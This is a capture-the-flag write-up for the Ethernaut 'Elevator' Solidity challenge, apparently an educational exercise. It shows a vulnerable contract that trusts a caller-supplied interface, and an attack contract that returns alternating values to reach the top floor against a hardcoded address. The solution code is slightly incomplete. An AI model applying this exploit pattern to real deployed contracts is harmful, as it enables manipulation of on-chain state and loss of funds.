## Challenge
~~~
This elevator won't let you reach the top of your building. Right?

##### Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
`

## Solution

```
contract Building is IBuilding{
    uint8 counter = 0;

    function isLastFloor(uint256) external returns (bool) {
        counter ++;
        if (counter % 2 == 0){
            return true;
        }
            return false;
    }

    function attack(uint256 _floor) external {
        Elevator elevator = Elevator(0x561FF3801486162bf9dbb7296059f0c1CE747143);
        elevator.goTo(_floor);
    }
```

## Key takeaways and useful resources

We cannot trust the implementation and correctness of third party contracts.


